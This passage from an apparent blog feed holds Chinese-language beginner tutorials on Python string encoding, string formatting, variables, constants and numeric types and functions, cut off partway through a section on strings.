string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：中 b<span class="token string">'\xe4\xb8\xad'</span> 中 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>举例4：<code>len()</code>函数计算的是str的字符数，如果换成bytes，len()函数就计算字节数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token string">'ABC'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>b<span class="token string">'ABC'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token string">'中文'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token number">3</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">6</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><ol><li>可见，1个中文字符经过UTF-8编码后通常<font color="#FF7F00"><strong>会占用3个字节，而1个英文字符只占用1个字节</strong></font>。</li><li>在操作字符串时，我们经常遇到str和bytes的互相转换。<font color="#FF7F00"><strong>为了避免乱码问题，应当始终坚持使用UTF-8编码对str和bytes进行转换</strong></font>。</li></ol></blockquote><br><br><h3 id="四-格式化"><font color="#FF6347" face="Comic sans MS">四. 格式化</font><a href="post/Python-Coding#四-格式化"></a></h3><blockquote><p><font color="#FF7F00"><strong>重要总结：</strong></font></p><ol><li>一个常见的问题是如何输出格式化的字符串。<ol><li>我们经常会输出类似”亲爱的<code>xxx</code>你好！你<code>xx</code>月的话费是<code>xx</code>，余额是<code>xx</code>“之类的字符串，而<code>xxx</code>的内容都是根据变量变化的，所以，需要一种简便的格式化字符串的方式。</li></ol></li><li>在Python中，采用的格式化方式和C语言是一致的，用<font color="#FF7F00"><strong>%</strong></font>实现。</li><li>%运算符就是用来格式化字符串的。在字符串内部，%s表示用字符串替换，%d表示用整数替换，有几个%?占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个%?，括号可以省略。</li><li>格式化整数还可以指定<font color="#FF7F00"><strong>是否补0和整数</strong></font>；浮点数可以指定<font color="#FF7F00"><strong>小数的位数</strong></font>。</li><li>要输出%，用%对其进行转义，即用%%来表示一个%。</li><li>另一种格式化字符串的方法是使用字符串的<font color="#FF7F00"><strong>format()方法</strong></font>，它会用传入的参数依次替换字符串内的占位符{0}、{1}……，不过这种方式写起来比%要麻烦得多</li></ol></blockquote><br><p>常见的占位符有：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">占位符</th><th align="center">替换内容</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">整数</td></tr><tr><td align="center">%f</td><td align="center">浮点数</td></tr><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%x</td><td align="center">十六进制整数</td></tr></tbody></table></div></div><br><p>示例代码：（里面的“//”并不代表注释符）</p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">'Hello, %s'</span> <span class="token operator">%</span> <span class="token string">'world'</span>    <span class="token operator">//</span> 替换一个不使用括号b <span class="token operator">=</span> <span class="token string">'Hi, %s, you have $%d.'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'Michael'</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>   <span class="token operator">//</span> 替换多个使用括号c <span class="token operator">=</span> <span class="token string">'%6d-%02d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token operator">//</span>  <span class="token operator">%</span><span class="token number">6d</span>  表示输出<span class="token number">3</span>之前有（<span class="token number">6</span><span class="token operator">-</span><span class="token number">1</span>）个空格输出                         <span class="token operator">//</span>  <span class="token operator">%</span><span class="token number">05d</span> 表示输出<span class="token number">1</span>之前有（<span class="token number">5</span><span class="token operator">-</span><span class="token number">1</span>）个<span class="token number">0</span>输出d <span class="token operator">=</span> <span class="token string">'%.2f'</span> <span class="token operator">%</span> <span class="token number">3.145926</span>    <span class="token operator">//</span>  <span class="token operator">%</span><span class="token punctuation">.</span><span class="token number">2f</span> 表示输出的浮点数保留两位小数，第三位小数<span class="token operator">>=</span><span class="token number">5</span>就向前进<span class="token number">1</span>e <span class="token operator">=</span> <span class="token string">'growth rate: %d %%'</span> <span class="token operator">%</span> <span class="token number">7</span>   <span class="token operator">//</span>  转义，用<span class="token operator">%</span><span class="token operator">%</span>表示一个<span class="token operator">%</span>输出f<span class="token operator">=</span><span class="token string">'Hello, {0}, 成绩提升了 {1:.1f}%'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span> <span class="token number">17.125</span><span class="token punctuation">)</span>                         <span class="token operator">//</span>  使用字符串format<span class="token punctuation">(</span><span class="token punctuation">)</span>方法，注意括号里面的<span class="token number">1</span>的意义<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>运行结果：Hello<span class="token punctuation">,</span> world Hi<span class="token punctuation">,</span> Michael<span class="token punctuation">,</span> you have $<span class="token number">1000000</span><span class="token punctuation">.</span>      <span class="token number">3</span><span class="token operator">-</span><span class="token number">000000001</span> <span class="token number">3.15</span>growth rate<span class="token punctuation">:</span> <span class="token number">7</span> <span class="token operator">%</span> Hello<span class="token punctuation">,</span> 小明<span class="token punctuation">,</span> 成绩提升了 <span class="token number">17.1</span><span class="token operator">%</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-变量和数据类型</title>
      <link href="/post/Python-Variables-DataTypes/"/>
      <url>/post/Python-Variables-DataTypes/</url>
      
        <content type="html"><![CDATA[<p>定义一个变量就是定义了一个指针！  ٩(ˊᗜˋ*)و<br>字符串内容很多，就很烦(っ ̯ -｡)</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">变量和数据类型</font> </center><br><br><h3 id="一-变量"><font color="#FF6347" face="Comic sans MS">一. 变量</font><a href="post/Python-Variables-DataTypes#一-变量"></a></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、关于变量</strong></font></p><blockquote><ol><li><font face="Comic sans MS">变量存储在内存中的值。这就意味着在创建变量时会<strong>在内存中开辟一个空间</strong>。</font></li><li><font face="Comic sans MS">基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。</font></li><li><font face="Comic sans MS">Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li><li><font face="Comic sans MS">在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</font></li></ol></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、变量的赋值</strong></font></p><blockquote><ol><li><font face="Comic sans MS">Python 中的变量赋值<font color="#FF7F00"><strong>不需要类型声明</strong></font>。</font></li><li><font face="Comic sans MS">每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。</font></li><li><font face="Comic sans MS">每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li><li><font face="Comic sans MS">变量的赋值分为：<font color="#FF7F00"><strong>单个变量赋值</strong></font>和<font color="#FF7F00"><strong>多个变量赋值</strong></font> </font></li></ol></blockquote><br><p><font face="Comic sans MS"><strong>单个变量赋值：</strong>使用等号（=）运算符左边是一个变量名,等号（=）运算符右边是存储在变量中的值。例如：</font></p><pre class="line-numbers language-python"><code class="language-python">message <span class="token operator">=</span> <span class="token string">"Hello Python world!"</span><span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><font face="Comic sans MS">我们添加了一个名为message的<strong>变量</strong>。每个变量都存储了一个<strong>值</strong>——与变量相关联的信息。在这里，存储的值为文本“Hello Python world!”。</font></p></blockquote><br><p><font face="Comic sans MS"><strong>多个变量赋值：</strong></font></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token comment" spellcheck="true">#以上实例，创建一个整型对象，值为1，三个变量被分配到相同的内存空间上。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><font face="Comic sans MS">或者</font></p><pre class="line-numbers language-python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"john"</span><span class="token comment" spellcheck="true">#以上实例，两个整型对象 1 和 2 分别分配给变量 a 和 b，字符串对象 "john" 分配给变量 c。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>三、变量的命名和使用</strong></font></p><blockquote><p><font color="#FF7F00"><strong>请务必牢记下述有关变量的规则：</strong></font></p><ol><li><font face="Comic sans MS">变量名只能包含<font color="#FF7F00"><strong>字母、数字</strong>和<strong>下划线</strong></font>。变量名可以字母或下划线打头，但不能以数字打头，例如，可将变量命名为message_1，但不能将其命名为1_message。 </font></li><li><font face="Comic sans MS"><font color="#FF7F00"><strong>变量名不能包含空格</strong></font>，但可使用下划线来分隔其中的单词。例如，变量名greeting_message可行，但变量名greeting message会引发错误。</font></li><li><font face="Comic sans MS"><font color="#FF7F00"><strong>不要将Python关键字和函数名用作变量名</strong></font>，即不要使用Python保留用于特殊用途的单词，如print。</font></li><li><font face="Comic sans MS">变量名应既简短又具有描述性。例如，name比n好，student_name比s_n好，name_length比length_of_persons_name好。</font></li><li><font face="Comic sans MS"><font color="#FF7F00"><strong>慎用小写字母l和大写字母O</strong></font>，因为它们可能被人错看成数字1和0。</font></li><li><font face="Comic sans MS">注意：就目前而言，<font color="#FF7F00"><strong>应使用小写的Python变量名</strong></font>。在变量名中使用大写字母虽然不会导致错误，但避免使用大写字母是个不错的主意。</font></li></ol></blockquote><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>四、变量是一种动态语言</strong></font><br>&emsp;<br>代码示例：<br><font color="#00B2EE"></font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>a <span class="token operator">=</span> <span class="token number">123</span> <span class="token comment" spellcheck="true"># a是整数</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token string">'ABC'</span> <span class="token comment" spellcheck="true"># a变为字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运行结果：<span class="token number">123</span> ABC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS">这种变量本身类型不固定的语言称之为<font color="red"><strong>动态语言</strong></font>，与之对应的是<font color="red"><strong>静态语言</strong></font>。和静态语言相比，<strong>动态语言更灵活</strong>，就是这个原因。静态语言在定义变量时必须指定变量类型，如果赋值的时候类型不匹配，就会报错。例如Java是静态语言，赋值语句如下（// 表示注释）：</font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a是整数类型变量</span>a <span class="token operator">=</span> <span class="token string">"ABC"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 错误：不能把字符串赋给整型变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE" face="Comic sans MS"><strong>五、Python的变量是Python的指针</strong></font> </p><p>可参考：<font color="#00B2EE">[<a href="https://www.cnblogs.com/hzwsj/p/5777973.html" target="_blank" rel="noopener">一切都是对象，一切都是指针，一切都是东西（python的编程哲学）</a>]</font><br>&emsp;<br>如下代码：</p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token number">5</span>a<span class="token operator">=</span><span class="token number">5</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>id<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行输出：<span class="token number">1769134320</span> <span class="token number">1769134320</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS">我们分别查一下他们的内存地址，发现地址是一样的。</font></p><blockquote><p><font face="Comic sans MS"><strong>于是我们可以这样理解：</strong></font></p><ol><li><font face="Comic sans MS"><font color="#FF7F00"><strong>python把一切数据，一切的一切都看作对象，在python中，没有变量，只有指针，要说变量，也是指针变量</strong></font>。</font></li><li><font face="Comic sans MS">这样的变量还有如：<strong>列表</strong>，<strong>字典的值</strong>。</font></li><li><font face="Comic sans MS"><font color="#FF7F00"><strong>但是字符串，数字等类型的变量，字典的键就是传值使用，不是指针，而是不可再改变的值</strong></font>。</font></li></ol></blockquote><p>&emsp;<br><strong>举例子</strong><br><font color="#00B2EE">例子1：</font>当我们写：<br><font color="#00B2EE"></font></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">'ABC'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font face="Comic sans MS">时，Python解释器干了两件事情：</font></p><blockquote><ol><li><font face="Comic sans MS">在内存中创建了一个’ABC’的字符串；</font></li><li><font face="Comic sans MS">在内存中创建了一个名为a的变量，<strong>并把它指向’ABC’</strong></font></li></ol></blockquote><p>&emsp;<br><font color="#00B2EE">例子2：</font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>a <span class="token operator">=</span> <span class="token string">'ABC'</span>b <span class="token operator">=</span> aa <span class="token operator">=</span> <span class="token string">'XYZ'</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>运行结果：ABC <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Comic sans MS">最后一行打印出变量b的内容到底是<strong><code>&#39;ABC&#39;</code></strong>呢还是<strong><code>&#39;XYZ&#39;</code></strong>？如果从数学意义上理解，就会错误地得出<strong><code>b</code></strong>和<strong><code>a</code></strong>相同，也应该是<strong><code>&#39;XYZ&#39;</code></strong>，但实际上<strong><code>b</code></strong>的值是<strong><code>&#39;ABC&#39;</code></strong>，让我们一行一行地执行代码，就可以看到到底发生了什么事：</font></p><ol><li><font face="Comic sans MS">执行a = ‘ABC’，解释器创建了字符串’ABC’和变量a，<strong>并把a指向’ABC’</strong>：</font></li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c760234f3b42.png" alt="1.png" data-zoomable></p></div><ol start="2"><li><font face="Comic sans MS">执行b = a，解释器创建了变量b，并把b指向a指向的字符串’ABC’：</font></li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c7602fa3c6f7.png" alt="0 (1).png" data-zoomable></p></div><ol start="3"><li><font face="Comic sans MS">执行a = ‘XYZ’，解释器创建了字符串’XYZ’，并把a的指向改为’XYZ’，但b并没有更改：</font></li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/02/27/5c7603411d5fc.png" alt="0 (2).png" data-zoomable></p></div><p><font face="Comic sans MS">所以，最后打印变量b的结果自然是’ABC’了。</font></p><br>&emsp;<h3 id="二-常量"><font color="#FF6347" face="Comic sans MS">二. 常量</font><a href="post/Python-Variables-DataTypes#二-常量"></a></h3><p><font face="Comic sans MS">所谓常量就是不能变的变量，比如常用的数学常数π就是一个常量。在Python中，<strong>通常用全部大写的变量名表示常量</strong>：</font></p><pre class="line-numbers language-python"><code class="language-python">PI <span class="token operator">=</span> <span class="token number">3.14159265359</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font face="Comic sans MS"><font color="#FF7F00"><strong>但事实上PI仍然是一个变量，Python根本没有任何机制保证PI不会被改变</strong></font>，所以，用全部大写的变量名表示常量只是一个习惯上的用法，如果你一定要改变变量PI的值，也没人能拦住你。</font></p><p><font color="#FF7F00"></font></p><h3 id="三-数据类型"><font color="#FF6347" face="Comic sans MS">三. 数据类型</font><a href="post/Python-Variables-DataTypes#三-数据类型"></a></h3><p><font face="Comic sans MS"><strong>标准数据类型</strong></font></p><p>在内存中存储的数据可以有多种类型。</p><p>Python 定义了一些标准类型，用于存储各种类型的数据。</p><blockquote><p><font face="Comic sans MS">Python<font color="#FF7F00"><strong>有五个标准</strong></font>的数据类型：</font></p><ol><li><font face="Microsoft YaHei">Numbers（数字）</font></li><li><font face="Microsoft YaHei">String（字符串）</font></li><li><font face="Sans-serif">List（列表）</font></li><li><font face="Sans-serif">Tuple（元组）</font></li><li><font face="Sans-serif">Dictionary（字典）</font></li></ol></blockquote><h4 id="3-1-数字运算和函数"><font color="#3CB371" face="Comic sans MS">3.1 数字运算和函数</font><a href="post/Python-Variables-DataTypes#3-1-数字运算和函数"></a></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、整数的定义和基础知识</strong></font> </p><ol><li><p><font face="Comic sans MS"><font color="#FF7F00"><strong>Python可以处理任意大小的整数，当然包括负整数</strong></font>，在程序中的表示方法和数学上的写法一模一样，例如：1，100，-8080，0，等等。</font></p></li><li><p><font face="Comic sans MS">计算机由于使用二进制，所以，有时候用<font color="#FF7F00"><strong>十六进制表示整数</strong></font>比较方便，十六进制用0x前缀和0-9，a-f表示，例如：0xff00，0xa5b4c3d2，等等。</font></p></li></ol><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、整数运算</strong></font> </p><p><font face="Comic sans MS">在Python中，可对整数执行加（<strong><code>+</code></strong>）减（<strong><code>-</code></strong>）乘（<strong><code>*</code></strong>）除（<strong><code>/</code></strong>）平方（<code>**</code>）取余（<code>%</code>）运算。</font></p><br><p><font face="Comic sans MS"><font color="red"><strong>注意事项：</strong></font> </font></p><blockquote><ol><li><font face="Comic sans MS">Python使用<font color="#FF7F00"><strong>两个乘号表示乘方运算：</strong></font><code>3 ** 2==9</code></font></li><li><font face="Comic sans MS">Python<font color="#FF7F00"><strong>整数的除法得到的结果是精确的</strong></font>。在Python中，有两种除法：</font><ol><li><font face="Comic sans MS">一种除法是<code>/</code>(结果是浮点数)</font></li><li><font face="Comic sans MS">另一种是除法是<code>//</code>，称为地板除(两个整数的除法仍然是整数) </font>  </li></ol></li><li><font face="Comic sans MS">因为<strong><code>//</code></strong>除法只取结果的整数部分，所以Python还提供一个余数运算(<code>%</code>)，可以得到两个整数相除的余数。</font></li></ol></blockquote><p>&emsp;<br>示例代码：</p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token number">10</span><span class="token operator">//</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>a<span class="token operator">=</span><span class="token number">10</span><span class="token operator">%</span><span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>运算结果：<span class="token number">3.3333333333333335</span> <span class="token number">3</span> <span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS"><strong>三、Number 类型转换</strong></font> </p><div class="article-bounded"><div class="article-table"><table><tbody><tr><td align="left">int(x [,base ])</td><td align="left">将x转换为一个整数</td></tr><tr><td align="left">long(x [,base ])</td><td align="left">将x转换为一个长整数</td></tr><tr><td align="left">float(x )</td><td align="left">将x转换到一个浮点数</td></tr><tr><td align="left">complex(real [,imag ])</td><td align="left">创建一个复数</td></tr><tr><td align="left">str(x )</td><td align="left">将对象 x 转换为字符串</td></tr><tr><td align="left">repr(x )</td><td align="left">将对象 x 转换为表达式字符串</td></tr><tr><td align="left">eval(str )</td><td align="left">用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td align="left">tuple(s )</td><td align="left">将序列 s 转换为一个元组</td></tr><tr><td align="left">list(s )</td><td align="left">将序列 s 转换为一个列表</td></tr><tr><td align="left">chr(x )</td><td align="left">将一个整数转换为一个字符</td></tr><tr><td align="left">unichr(x )</td><td align="left">将一个整数转换为Unicode字符</td></tr><tr><td align="left">ord(x )</td><td align="left">将一个字符转换为它的整数值</td></tr><tr><td align="left">hex(x )</td><td align="left">将一个整数转换为一个十六进制字符串</td></tr><tr><td align="left">oct(x )</td><td align="left">将一个整数转换为一个八进制字符串</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>四、数学函数</strong></font> </p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">函数</th><th align="left">返回值 ( 描述 )</th></tr></thead><tbody><tr><td align="left">abs(x)</td><td align="left">返回数字的绝对值，如abs(-10) 返回 10</td></tr><tr><td align="left">ceil(x)</td><td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td></tr><tr><td align="left">cmp(x, y)</td><td align="left">如果 x &lt; y 返回 -1, 如果 x == y 返回 0, 如果 x &gt; y 返回 1</td></tr><tr><td align="left">exp(x)</td><td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td></tr><tr><td align="left">fabs(x)</td><td align="left">返回数字的绝对值，如math.fabs(-10) 返回10.0</td></tr><tr><td align="left">floor(x)</td><td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td></tr><tr><td align="left">log(x)</td><td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td></tr><tr><td align="left">log10(x)</td><td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td></tr><tr><td align="left">max(x1, x2,…)</td><td align="left">返回给定参数的最大值，参数可以为序列。</td></tr><tr><td align="left">min(x1, x2,…)</td><td align="left">返回给定参数的最小值，参数可以为序列。</td></tr><tr><td align="left">modf(x)</td><td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td></tr><tr><td align="left">pow(x, y)</td><td align="left">x**y 运算后的值。</td></tr><tr><td align="left">round(x [,n])</td><td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td></tr><tr><td align="left">sqrt(x)</td><td align="left">返回数字x的平方根</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>五、随机数函数</strong></font> </p><p><font face="Comic sans MS">随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</font></p><p>Python包含以下常用随机数函数：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">choice(seq)</td><td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，<br>从0到9中随机挑选一个整数。</td></tr><tr><td align="left">randrange</td><td align="left">([start,] stop [,step])    从指定范围内，按指定基数递增的集合中获取一个随机数，<br>基数缺省值为1</td></tr><tr><td align="left">random()</td><td align="left">随机生成下一个实数，它在[0,1)范围内。</td></tr><tr><td align="left">seed([x])</td><td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，<br>Python会帮你选择seed。</td></tr><tr><td align="left">shuffle(lst)</td><td align="left">将序列的所有元素随机排序</td></tr><tr><td align="left">uniform(x, y)</td><td align="left">随机生成下一个实数，它在[x,y]范围内。</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>六、三角函数</strong></font> </p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">acos(x)</td><td align="left">返回x的反余弦弧度值。</td></tr><tr><td align="left">asin(x)</td><td align="left">返回x的反正弦弧度值。</td></tr><tr><td align="left">atan(x)</td><td align="left">返回x的反正切弧度值。</td></tr><tr><td align="left">atan2(y, x)</td><td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td></tr><tr><td align="left">cos(x)</td><td align="left">返回x的弧度的余弦值。</td></tr><tr><td align="left">hypot(x, y)</td><td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td></tr><tr><td align="left">sin(x)</td><td align="left">返回的x弧度的正弦值。</td></tr><tr><td align="left">tan(x)</td><td align="left">返回x弧度的正切值。</td></tr><tr><td align="left">degrees(x)</td><td align="left">将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0</td></tr><tr><td align="left">radians(x)</td><td align="left">将角度转换为弧度</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>七、数学常量</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pi</td><td align="left">数学常量 pi（圆周率，一般以π来表示）</td></tr><tr><td align="left">e</td><td align="left">数学常量 e，e即自然常数（自然常数）。</td></tr></tbody></table></div></div><br><p><font color="#00B2EE" face="Comic sans MS"><strong>八、 range()函数</strong><br></font></p><p><font face="Comic sans MS">Python3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表。<br></font></p><p><font face="Comic sans MS">Python3 list() 函数是对象迭代器，可以把range()返回的可迭代对象转为一个列表，返回的变量类型为列表。<br></font></p><p><font face="Comic sans MS">Python2 range() 函数返回的是列表。<br></font></p><p><font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-built-in-functions.html" target="_blank" rel="noopener">Python3 内置函数</a>]</font></font>&emsp;<font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-func-range.html" target="_blank" rel="noopener">Python3 range() 函数用法</a>]</font><br></font></p><br><p><strong>函数语法：</strong><br><font color="#FF7F00"><strong>range(stop)</strong></font><br><font color="#FF7F00"><strong>range(start, stop[, step])</strong></font></p><br><blockquote><p><strong>参数说明：</strong><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>start:</strong></font> 计数从 start开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>stop:</strong></font> 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>step：</strong></font>步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</font></p></blockquote><br><br><h4 id="3-2-浮点数"><font color="#3CB371" face="Comic sans MS">3.2 浮点数</font><a href="post/Python-Variables-DataTypes#3-2-浮点数"></a></h4><ol><li><p><font face="Comic sans MS">浮点数也就是小数，之所以称为浮点数，<strong>是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的</strong>，比如，1.23x10^9和12.3x10^8是完全相等的。浮点数可以用数学写法，如<strong><code>1.23</code></strong>，<strong><code>3.14</code></strong>，<strong><code>-9.01</code></strong>，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，<strong>把10用e替代</strong>，1.23x109就是<strong><code>1.23e9</code></strong>，或者<strong><code>12.3e8</code></strong>，0.000012可以写成<strong><code>1.2e-5</code></strong>，等等。</font></p></li><li><p><font face="Comic sans MS">整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。</font></p></li></ol><br><h4 id="3-3-字符串"><font color="#3CB371" face="Comic sans MS">3.3 字符串</font><a href="post/Python-Variables-DataTypes#3-3-字符串"></a></h4><h5 id="1-定义字符串并输出"><font color="#00B2EE" face="Comic sans MS">1.定义字符串并输出</font><a href="post/Python-Variables-DataTypes#1-定义字符串并输出"></a></h5><ol><li><font face="Comic sans MS"><font color="red" face="Comic sans MS"><strong>区分单引号和双引号：</strong></font>字符串是以单引号<strong><code>&#39;</code></strong>或双引号<strong><code>&quot;</code></strong>括起来的任意文本，比如<strong><code>&#39;abc&#39;</code></strong>，<strong><code>&quot;xyz&quot;</code></strong>等等。</font><br><font face="Comic sans 